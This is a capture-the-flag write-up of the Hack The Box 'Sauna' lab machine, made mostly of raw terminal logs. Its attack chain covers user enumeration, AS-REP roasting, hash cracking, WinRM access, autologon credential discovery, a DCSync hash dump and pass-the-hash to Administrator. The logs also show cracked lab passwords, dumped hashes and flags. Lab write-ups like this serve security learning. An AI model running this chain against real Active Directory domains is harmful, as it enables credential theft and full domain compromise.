# HTB-Sauna

<img width="862" height="793" alt="Screenshot 2025-09-20 214022" src="https://github.com/AmIACatPurr/HTB-CTF/blob/main/writeups/assets/sauna.jpg" />


---
## Intro
xxx
xxx
xxx
xxx
---

## nmap & enumeration

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~]
└──╼ [★]$ nmap -p- --min-rate 10000 10.129.39.213
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-05 07:57 CDT
Nmap scan report for 10.129.39.213
Host is up (0.0080s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49696/tcp open  unknown
49715/tcp open  unknown
```

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~]
└──╼ [★]$ nmap -p 53,80,88,135,139,389,445,464,593,3268,3269,5985,9389 -sC -sV 10.129.39.213
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-05 08:01 CDT
Nmap scan report for 10.129.39.213
Host is up (0.0080s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-05 20:01:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-05T20:01:33
|_  start_date: N/A
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.39.213/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.39.213/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--> http://10.129.39.213/images/]
/Images               (Status: 301) [Size: 151] [--> http://10.129.39.213/Images/]
/css                  (Status: 301) [Size: 148] [--> http://10.129.39.213/css/]
/fonts                (Status: 301) [Size: 150] [--> http://10.129.39.213/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> http://10.129.39.213/IMAGES/]
/Fonts                (Status: 301) [Size: 150] [--> http://10.129.39.213/Fonts/]
/CSS                  (Status: 301) [Size: 148] [--> http://10.129.39.213/CSS/]
Progress: 220560 / 220561 (100.00%)
```

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~]
└──╼ [★]$ nikto -h http://10.129.39.213
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.39.213
+ Target Hostname:    10.129.39.213
+ Target Port:        80
+ Start Time:         2026-05-05 08:11:22 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-05-05 08:12:39 (GMT-5) (77 seconds)
```

```bash

┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~]
└──╼ [★]$ smbmap -H 10.129.39.213
[+] IP: 10.129.39.213:445	Name: 10.129.39.213

                                  
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~]
└──╼ [★]$ smbclient -N -L //10.129.39.213
Anonymous login successful

┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~]
└──╼ [★]$ rpcclient 10.129.39.213 -N
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE


┌─[✗]─[root@htb-oh3wnolosf]─[/home/justdave]
└──╼ #ldapsearch -x -H ldap://10.129.39.213 -b "" -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1


┌─[✗]─[root@htb-oh3wnolosf]─[/home/justdave]
└──╼ #ldapsearch -x -H ldap://10.129.39.213 -b "DC=EGOTISTICAL-BANK,DC=LOCAL" "(objectClass=*)"
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20260505194813.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
uSNChanged: 102433
name: EGOTISTICAL-BANK
objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
replUpToDateVector:: AgAAAAAAAAAHAAAAAAAAAJqTZgKeNkBJlc4LFr+H0BYXkAEAAAAAAHraC
 iADAAAARsb/VEiFdUq/CcLUBWrijxaAAQAAAAAAHHgPFwMAAACrjO940UmFRLLC7Zxl/q+tDOAAAA
 AAAAAoOP4WAwAAANzRVIHxYS5CtEQKQAnmhHUVcAEAAAAAANRuDxcDAAAA/VqFkkbeXkGqVm5qQCP
 2DAvQAAAAAAAA0PAKFQMAAACb8MWfbB18RYsV+i8aPhNOFGABAAAAAAAQ1QAXAwAAAEC+4LPGJexE
 srmf+FxEsuwJsAAAAAAAANQEUhQDAAAA
creationTime: 134224840930374786
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 1
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name
 ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT
 ISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E
 GOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC
 AL-BANK,DC=LOCAL
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA
 L-BANK,DC=LOCAL
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D
 C=LOCAL
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: EGOTISTICAL-BANK

# Users, EGOTISTICAL-BANK.LOCAL
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

# Computers, EGOTISTICAL-BANK.LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL

# Domain Controllers, EGOTISTICAL-BANK.LOCAL
dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL

# System, EGOTISTICAL-BANK.LOCAL
dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL

# LostAndFound, EGOTISTICAL-BANK.LOCAL
dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL

# Infrastructure, EGOTISTICAL-BANK.LOCAL
dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL

# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL
dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL

# Program Data, EGOTISTICAL-BANK.LOCAL
dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL

# NTDS Quotas, EGOTISTICAL-BANK.LOCAL
dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL

# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL

# Keys, EGOTISTICAL-BANK.LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL

# TPM Devices, EGOTISTICAL-BANK.LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL

# Builtin, EGOTISTICAL-BANK.LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL

# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL

# search reference
ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC
 AL

# search result
search: 2
result: 0 Success

# numResponses: 19
# numEntries: 15
# numReferences: 3

┌─[root@htb-oh3wnolosf]─[/home/justdave]
└──╼ #dig axfr @10.129.39.213 egotistical-bank.local

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr @10.129.39.213 egotistical-bank.local
; (1 server found)
;; global options: +cmd
; Transfer failed.


```

```bash
Installing kerbrute
┌─[✗]─[root@htb-oh3wnolosf]─[/home/justdave]
└──╼ #go install github.com/ropnop/kerbrute@latest

Copying in bin
cp ~/go/bin/kerbrute /usr/local/bin/

It was taking too much time so i stopped, i got the idea for the naming convention since i recognize the names
that i saw on the web site
┌─[root@htb-oh3wnolosf]─[~/go/bin]
└──╼ #kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.39.213

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 05/05/26 - Ronnie Flathers @ropnop

2026/05/05 08:28:08 >  Using KDC(s):
2026/05/05 08:28:08 >  	10.129.39.213:88

2026/05/05 08:28:09 >  [+] VALID USERNAME:	 administrator@EGOTISTICAL-BANK.LOCAL
2026/05/05 08:28:24 >  [+] VALID USERNAME:	 hsmith@EGOTISTICAL-BANK.LOCAL
2026/05/05 08:28:26 >  [+] VALID USERNAME:	 Administrator@EGOTISTICAL-BANK.LOCAL
2026/05/05 08:28:37 >  [+] VALID USERNAME:	 fsmith@EGOTISTICAL-BANK.LOCAL
2026/05/05 08:30:20 >  [+] VALID USERNAME:	 Fsmith@EGOTISTICAL-BANK.LOCAL

names to add in users.txt
fsmith
scoins
sdriver
btayload
hbear
skerb

┌─[✗]─[root@htb-oh3wnolosf]─[~/go/bin]
└──╼ #nano users.txt

┌─[root@htb-oh3wnolosf]─[~/go/bin]
└──╼ #GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.129.39.213
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:fdae7f3db965e88dafff876086cc6ef4$ed74def130fc0e6194a7ec20bd3120f956a34a88073d1354a20a2ad355871d8ed400de8663269e3bd050f9dac3e3d662523ccfbd3144cce6988c2b8d5cf70e44406004cf689006ad19868832eacaaa391e38078de78d48e92b4b77bf7ead670eeff00989b88de07eb0fbce62709ee0ac0ad4d4f86e9ab3a3054cbff89fbdaa7e5f3b10c8d08fa3f31bbc0f95c7082ec17dd62e0283013d1d567cf8676f2912bf5a16ef789c0410ee199eca545dbbeec9f3549c5c9f8fdca4644e658d997d1c33e5f40c7ae7bcd2a82563085ec4b890e1cb2c37f1ac114e6e75d6e94f3b457fd84c6e65cd71003903e93fc0052c02ef59cd7c869298cd28cf1d22c91ce2107972

┌─[✗]─[root@htb-oh3wnolosf]─[~/go/bin]
└──╼ #nano hashes

┌─[✗]─[root@htb-oh3wnolosf]─[/usr/share/wordlists]
└──╼ #gunzip rockyou.txt.gz 

┌─[root@htb-oh3wnolosf]─[~/go/bin]
└──╼ #hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt --force

...snip...

password per fsmith - Thestrokes23


┌─[root@htb-oh3wnolosf]─[~/go/bin]
└──╼ #evil-winrm -i 10.129.39.213 -u fsmith -p Thestrokes23

Flag - b814d9c8a95c8ebd0aeae7f6718aea8a

checking what can i see, nut nothing much

systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

whoami /priv

net user /domain

net user fsmith /domain

i go back at my machine for more checks

┌─[✗]─[root@htb-oh3wnolosf]─[/home/justdave]
└──╼ #nxc smb 10.129.39.213 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
SMB         10.129.39.213   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.39.213   445    SAUNA            [+] Egotistical-bank.local\fsmith:Thestrokes23

┌─[root@htb-oh3wnolosf]─[/home/justdave]
└──╼ #nxc winrm 10.129.39.213 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
WINRM       10.129.39.213   5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM       10.129.39.213   5985   SAUNA            [+] Egotistical-bank.local\fsmith:Thestrokes23 (Pwn3d!)

ok i go get winpeas on attacking machine
https://github.com/peass-ng/PEASS-ng/releases/download/20260501-5805575d/winPEASx64.exe

and i run
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~/Desktop]
└──╼ [★]$ smbserver.py -username cat -password cat share . -smb2support
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies

then i do this
*Evil-WinRM* PS C:\Users\FSmith\Desktop> net use \\10.10.14.98\share /u:cat cat
The command completed successfully.

and that... and wait..takes a bit
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.98\share> .\winPEASexe cmd fast > lolwinpeas

well, this is nice
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!


┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-oh3wnolosf]─[~/Desktop]
└──╼ [★]$ bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.39.213 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (SAUNA.EGOTISTICAL-BANK.LOCAL:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 02S

controlla se avviato e metti - neo4j come user / pass
http://localhost:7474

runna il comando - bloodhound

upload data
search for SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL -> owned
Node Info -> First Degree Object Control
yes i can do a DCsync

it worked :O
┌─[✗]─[root@htb-oh3wnolosf]─[/home/justdave]
└──╼ #impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.39.213'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:c612567a6b545002086676986b78674c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:a16f7d1c2af3dc7ff75011e396de752531ee355b551dcd763307e8741fe2acf3
SAUNA$:aes128-cts-hmac-sha1-96:fa9e560cee021afbea4d2f85db86962b
SAUNA$:des-cbc-md5:9154646d02c110f8
[*] Cleaning up... 

wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.129.39.213 administrator@10.129.39.213

Got the administrator flag
C:\users\Administrator\Desktop>type root.txt
dbd82278738cab49e32d2c726eca74e3


```

